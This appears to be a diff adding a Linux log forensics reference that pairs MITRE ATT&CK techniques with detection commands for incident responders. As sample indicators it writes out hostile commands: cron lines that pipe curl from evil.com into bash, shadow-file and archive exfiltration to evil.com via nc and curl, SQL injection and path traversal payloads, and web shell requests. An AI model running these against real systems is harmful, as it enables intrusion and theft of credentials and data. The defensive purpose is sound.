@@ -1,0 +1,382 @@
+# Log Forensics — Attack Indicators and Incident Analysis
+# Framework: MITRE ATT&CK, NIST SP 800-92, SANS Incident Handling
+# Scope: Log-based forensic analysis, IOCs, attack pattern detection
+
+## DISTRO-SPECIFIC LOG PATHS
+
+RHEL / CentOS / Rocky / AlmaLinux:
+  /var/log/secure              — Authentication events (SSH, sudo, su)
+  /var/log/messages            — General system messages
+  /var/log/audit/audit.log     — SELinux AVC, syscall audit, file access
+  /var/log/yum.log             — Package install/update history (RHEL 7)
+  /var/log/dnf.log             — Package history (RHEL 8/9)
+  /var/log/firewalld           — Firewall events
+  journalctl                   — Systemd journal (all of the above)
+
+Ubuntu / Debian:
+  /var/log/auth.log            — Authentication events (SSH, sudo, su)
+  /var/log/syslog              — General system messages
+  /var/log/kern.log            — Kernel messages
+  /var/log/dpkg.log            — Package install/update history
+  /var/log/apt/history.log     — APT operations
+  /var/log/ufw.log             — UFW firewall events
+  journalctl                   — Systemd journal
+
+Common:
+  /var/log/wtmp                — Login records (read with: last)
+  /var/log/btmp                — Failed login records (read with: lastb)
+  /var/log/lastlog             — Last login per user (read with: lastlog)
+  /var/log/faillog             — Failed login counts (read with: faillog)
+  ~/.bash_history              — User command history
+  /var/log/cron                — Cron execution log (RHEL)
+  /var/log/apache2/            — Apache logs (Ubuntu/Debian)
+  /var/log/httpd/              — Apache logs (RHEL)
+  /var/log/nginx/              — Nginx logs
+
+## AUTHENTICATION FORENSICS
+
+### Issue: Brute force attack indicators
+Severity: HIGH
+CVSS: 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
+MITRE: T1110.001 (Brute Force: Password Guessing)
+Affected: All Linux distros
+
+What to look for:
+  # SSH brute force in auth.log/secure:
+  Failed password for root from 203.0.113.50 port 22 ssh2
+  Failed password for invalid user admin from 203.0.113.50 port 22 ssh2
+  # Multiple failures from same IP = brute force
+  # Count failures per IP:
+  grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
+
+  # Successful login after brute force = CRITICAL (likely compromised):
+  Failed password for root from 203.0.113.50 port 22 ssh2  (repeated)
+  Accepted password for root from 203.0.113.50 port 22 ssh2  # COMPROMISE
+
+  # Password spray (different usernames, same password):
+  Failed password for user1 from 203.0.113.50
+  Failed password for user2 from 203.0.113.50
+  Failed password for admin from 203.0.113.50
+
+  # Key-based auth from new/unknown keys:
+  Accepted publickey for root from 10.0.0.99 port 12345 ssh2: RSA SHA256:<fingerprint>
+  # Compare fingerprint against authorized_keys inventory
+
+### Issue: Suspicious su/sudo activity
+Severity: HIGH
+CVSS: 7.8 (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
+MITRE: T1548.003 (Abuse Elevation Control: Sudo)
+Affected: All Linux distros
+
+What to look for:
+  # Sudo to root shell:
+  sudo: user1 : TTY=pts/0 ; PWD=/home/user1 ; USER=root ; COMMAND=/bin/bash
+  sudo: user1 : TTY=pts/0 ; PWD=/home/user1 ; USER=root ; COMMAND=/bin/su -
+  sudo: user1 : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh
+  # Sudo from unusual directories (especially /tmp, /dev/shm):
+  PWD=/tmp ; USER=root ; COMMAND=...    # Suspicious
+  PWD=/dev/shm ; USER=root ; COMMAND=   # Highly suspicious
+
+  # Failed sudo attempts (wrong password or unauthorized):
+  sudo: user1 : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/user1
+
+  # su to root:
+  su[12345]: Successful su for root by user1
+  su[12345]: FAILED su for root by user1    # Failed attempts
+  su[12345]: - /dev/pts/0 user1:root        # su session opened
+
+### Issue: Off-hours or unusual authentication
+Severity: MEDIUM
+CVSS: 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)
+MITRE: T1078 (Valid Accounts)
+Affected: All Linux distros
+
+What to look for:
+  # Logins between 00:00-05:00 or weekends (adjust for timezone):
+  last -F | grep -E "(Sat|Sun|00:|01:|02:|03:|04:|05:)"
+  # Login from new/unusual source IPs:
+  last | awk '{print $3}' | sort -u    # Compare against known IPs
+  # Login to service accounts that should never be interactive:
+  Accepted password for www-data from ...
+  Accepted password for mysql from ...
+  Accepted password for postgres from ...
+  # session opened for user nobody, daemon, bin, sys
+
+## PRIVILEGE ESCALATION INDICATORS
+
+### Issue: Unexpected setuid/setgid syscalls in audit log
+Severity: CRITICAL
+CVSS: 8.8 (AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)
+MITRE: T1548 (Abuse Elevation Control)
+Affected: All Linux distros (with auditd)
+
+What to look for:
+  # /var/log/audit/audit.log:
+  type=SYSCALL msg=audit(...): arch=... syscall=105 success=yes ... uid=1000 euid=0
+  # syscall=105 = setuid, uid=1000 euid=0 = user became root
+  # syscall=113 = setreuid
+  # syscall=117 = setresuid
+
+  # Unexpected processes running as root:
+  ps aux | awk '$1 == "root"' | grep -v -E "(sshd|systemd|init|kthread|cron|rsyslog)"
+
+  # PwnKit (CVE-2021-4034) indicators:
+  type=SYSCALL ... comm="pkexec" ... uid=1000 euid=0
+  # With unusual arguments or from /tmp
+
+  # DirtyPipe (CVE-2022-0847) indicators:
+  # Modified SUID binaries (check with AIDE/rpm -Va/debsums)
+
+### Issue: New user accounts or UID 0 accounts created
+Severity: CRITICAL
+CVSS: 9.1 (AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)
+MITRE: T1136 (Create Account)
+Affected: All Linux distros
+
+What to look for:
+  # /var/log/auth.log or /var/log/secure:
+  useradd[1234]: new user: name=backdoor, UID=0, GID=0    # UID 0 = root equivalent
+  useradd[1234]: new user: name=support, UID=1001          # New account
+  usermod[1234]: change user 'user1' UID from '1001' to '0'  # UID changed to root!
+
+  # Check /etc/passwd for UID 0 accounts:
+  awk -F: '$3 == 0 {print $1}' /etc/passwd
+  # Only "root" should have UID 0
+
+  # New authorized_keys entries:
+  grep -r "ssh-rsa\|ssh-ed25519\|ecdsa-sha2" /home/*/.ssh/authorized_keys /root/.ssh/authorized_keys
+  # Compare against baseline — new keys = potential backdoor
+
+## PERSISTENCE MECHANISMS
+
+### Issue: Modified cron jobs or systemd units
+Severity: HIGH
+CVSS: 7.8 (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
+MITRE: T1053 (Scheduled Task/Job)
+Affected: All Linux distros
+
+What to look for:
+  # Recently modified cron files:
+  find /etc/cron* /var/spool/cron* -type f -mtime -7 2>/dev/null
+  # Suspicious cron entries:
+  * * * * * curl http://evil.com/payload | bash       # Reverse shell
+  * * * * * wget -q http://evil.com/miner -O /tmp/m && chmod +x /tmp/m && /tmp/m
+  */5 * * * * /tmp/.hidden_script.sh                  # Hidden in /tmp
+  @reboot /dev/shm/.persist                           # Runs on reboot from ramdisk
+
+  # New systemd service/timer units:
+  find /etc/systemd/system/ /usr/lib/systemd/system/ -type f -mtime -7 2>/dev/null
+  # Suspicious: ExecStart pointing to /tmp, /dev/shm, or user writable dirs
+
+  # Modified shell profiles:
+  find /etc/profile.d/ /home/*/.bashrc /home/*/.profile /root/.bashrc -mtime -7 2>/dev/null
+  # Look for: reverse shells, curl/wget payloads, base64 decode, eval
+
+### Issue: Kernel module backdoors
+Severity: CRITICAL
+CVSS: 9.1 (AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H)
+MITRE: T1547.006 (Boot/Logon Autostart: Kernel Modules)
+Affected: All Linux distros
+
+What to look for:
+  # Recently loaded modules:
+  dmesg | grep -i "module\|insmod\|modprobe"
+  # Check for non-standard modules:
+  lsmod | grep -v -E "(ext4|xfs|btrfs|nf_|ip_|bridge|veth|overlay)"
+  # Recently modified module files:
+  find /lib/modules/$(uname -r) -name "*.ko" -mtime -7 2>/dev/null
+  # Audit log for module loading:
+  ausearch -m MODULE_LOAD -ts recent
+  # Check /etc/modules-load.d/ and /etc/modprobe.d/ for suspicious entries
+
+## LATERAL MOVEMENT
+
+### Issue: SSH connections to internal hosts
+Severity: MEDIUM
+CVSS: 5.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N)
+MITRE: T1021.004 (Remote Services: SSH)
+Affected: All Linux distros
+
+What to look for:
+  # Outbound SSH connections from compromised host:
+  # /var/log/auth.log:
+  sshd[1234]: Accepted publickey for user1 from 10.0.1.50 port 22
+  # Multiple hosts accessed in sequence:
+  ss -tnp | grep ":22"                  # Active SSH connections
+  last -d | grep -v "reboot\|wtmp"     # Login history showing source IPs
+  # SSH agent forwarding used:
+  grep "agent forwarding" /var/log/auth.log
+
+  # Network connections to other internal hosts (post-compromise pivoting):
+  netstat -tnp | grep ESTABLISHED       # Or: ss -tnp
+  # Look for connections to internal IPs on admin ports:
+  # :22 (SSH), :3389 (RDP), :5985 (WinRM), :445 (SMB), :3306 (MySQL)
+
+### Issue: Data transfer/exfiltration indicators
+Severity: HIGH
+CVSS: 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
+MITRE: T1048 (Exfiltration Over Alternative Protocol)
+Affected: All Linux distros
+
+What to look for:
+  # Large outbound transfers:
+  # Check network connections: ss -tnp | grep ESTABLISHED
+  # Unusual outbound ports or external IPs
+
+  # Command history showing data collection:
+  grep -E "tar|zip|7z|gzip|scp|rsync|curl|wget|nc|ncat|socat" /home/*/.bash_history /root/.bash_history
+  # Specific patterns:
+  tar czf /tmp/data.tar.gz /etc /home /var/lib/mysql      # Archiving sensitive dirs
+  curl -X POST -d @/tmp/data.tar.gz http://evil.com/upload # Exfiltration
+  base64 /etc/shadow | nc evil.com 4444                     # Encoded exfil
+  scp /tmp/dump.sql user@external.com:/tmp/                 # SCP to external
+
+  # DNS tunneling indicators:
+  # Very long DNS queries (> 50 chars) in DNS logs:
+  # dnsmasq or named log: query[TXT] aGVsbG8gd29ybGQ.evil.com
+  # High volume of DNS queries to single domain
+
+## LOG TAMPERING
+
+### Issue: Evidence of log modification or clearing
+Severity: CRITICAL
+CVSS: 8.1 (AV:L/AC:L/PR:H/UI:N/S:C/C:N/I:H/A:H)
+MITRE: T1070 (Indicator Removal on Host)
+Affected: All Linux distros
+
+What to look for:
+  # Cleared/truncated log files:
+  ls -la /var/log/auth.log /var/log/secure /var/log/syslog /var/log/messages
+  # File size 0 or suspiciously small = cleared
+  # Modification time recent but file small = truncated
+
+  # Gaps in log timestamps:
+  # auth.log entries jump from Mar 10 to Mar 15 = 5 days missing
+
+  # Cleared wtmp/btmp/lastlog:
+  ls -la /var/log/wtmp /var/log/btmp /var/log/lastlog
+  # Empty or recently modified with small size = cleared
+  last | wc -l       # Very few entries on a system that's been running = suspicious
+
+  # Cleared bash history:
+  ls -la /home/*/.bash_history /root/.bash_history
+  # File size 0, or missing, or contains only "history -c", "cat /dev/null > ~/.bash_history"
+  # Check for HISTFILE unset in .bashrc:
+  grep "HISTFILE\|HISTSIZE=0\|unset HIST" /home/*/.bashrc /root/.bashrc
+  # HISTSIZE=0 or HISTFILESIZE=0 or unset HISTFILE = history disabled
+
+  # Audit log tampering:
+  ausearch -m AUDIT_BACKLOG_LIMIT           # Audit system overwhelmed
+  # Missing audit.log or recently rotated/truncated:
+  ls -la /var/log/audit/audit.log*
+  # Check if auditd was stopped:
+  journalctl -u auditd | grep "Stopping\|stopped"
+
+Why it matters:
+  Log clearing is a strong indicator of intrusion. Attackers clear logs to hide initial access, lateral movement, and persistence mechanisms.
+
+Remediation:
+  # Forward logs to remote syslog (cannot be cleared by local attacker):
+  # RHEL: /etc/rsyslog.conf:
+  *.* @@syslog.example.com:514
+  # Ubuntu: /etc/rsyslog.d/50-remote.conf:
+  *.* @@syslog.example.com:514
+  # Use immutable log files:
+  chattr +a /var/log/auth.log     # Append-only
+  chattr +a /var/log/secure
+  # Configure auditd for immutable mode:
+  # /etc/audit/audit.rules:
+  -e 2    # Makes audit config immutable until reboot
+
+## WEB ATTACK INDICATORS
+
+### Issue: SQL injection attempts in web access logs
+Severity: CRITICAL
+CVSS: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
+MITRE: T1190 (Exploit Public-Facing Application)
+Affected: All web servers
+
+What to look for:
+  # Apache/Nginx access logs:
+  # URL-encoded SQL injection patterns:
+  union+select, UNION%20SELECT, union%20all%20select
+  %27+or+1%3D1, ' or 1=1--, '%20OR%20''='
+  %3B%20DROP, ;+DROP+TABLE, ;+DELETE+FROM
+  information_schema, table_name, column_name
+  SLEEP%285%29, BENCHMARK%2810000000
+  %27%3B%20WAITFOR%20DELAY
+  # Automated scanner indicators:
+  User-Agent: sqlmap/1.x
+  User-Agent: Havij
+  # Mass parameter testing (same URL, different payloads):
+  /login?user=admin' AND 1=1--
+  /login?user=admin' AND 1=2--
+  /login?user=admin' UNION SELECT null,null--
+
+### Issue: Web shell and reverse shell indicators
+Severity: CRITICAL
+CVSS: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
+MITRE: T1505.003 (Server Software Component: Web Shell)
+Affected: All web servers
+
+What to look for:
+  # Unusual POST requests to PHP/JSP/ASPX files:
+  POST /uploads/shell.php HTTP/1.1                    # Uploaded web shell
+  POST /wp-content/uploads/2024/01/x.php HTTP/1.1    # WordPress upload dir
+  POST /images/cmd.jsp HTTP/1.1                       # JSP web shell
+  GET /shell.php?cmd=id HTTP/1.1                      # Command execution
+  GET /c99.php HTTP/1.1                               # Known web shell name
+  GET /r57.php HTTP/1.1                               # Known web shell name
+  GET /b374k.php HTTP/1.1                             # Known web shell name
+
+  # Base64 encoded commands in URL parameters:
+  ?cmd=L2Jpbi9iYXNo                                   # /bin/bash in base64
+  ?exec=d2hvYW1p                                       # whoami in base64
+
+  # File creation in web-accessible directories:
+  find /var/www -name "*.php" -mtime -7 2>/dev/null    # Recent PHP files
+  find /var/www -name "*.php" -exec grep -l "system\|exec\|passthru\|shell_exec\|eval\|base64_decode" {} \;
+
+### Issue: Path traversal attack attempts
+Severity: HIGH
+CVSS: 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
+MITRE: T1190
+Affected: All web servers
+
+What to look for:
+  # In access logs:
+  GET /..%2f..%2f..%2fetc/passwd
+  GET /....//....//....//etc/shadow
+  GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd
+  GET /static/..%252f..%252f..%252fetc/passwd    # Double URL encoding
+  GET /download?file=../../../etc/shadow
+  GET /include?page=/etc/passwd
+  # Null byte injection (older systems):
+  GET /image.php?file=../../../etc/passwd%00.jpg
+
+### Issue: Vulnerability scanner activity
+Severity: INFO
+CVSS: 0.0 (informational)
+MITRE: T1595 (Active Scanning)
+Affected: All web servers
+
+What to look for:
+  # Known scanner user-agents:
+  User-Agent: Nmap Scripting Engine
+  User-Agent: nikto
+  User-Agent: sqlmap
+  User-Agent: DirBuster
+  User-Agent: Gobuster
+  User-Agent: wfuzz
+  User-Agent: Burp Suite
+  User-Agent: OWASP ZAP
+  User-Agent: Acunetix
+  User-Agent: Nessus
+  User-Agent: Qualys
+
+  # High volume of 404 responses from single IP = directory brute force
+  # Rapid sequential requests to different paths = automated scanning
+  # Requests to common admin paths: /admin, /wp-admin, /phpmyadmin, /manager
+
+Why it matters:
+  Scanner activity indicates reconnaissance. If followed by targeted exploitation attempts, it suggests an active attack in progress.
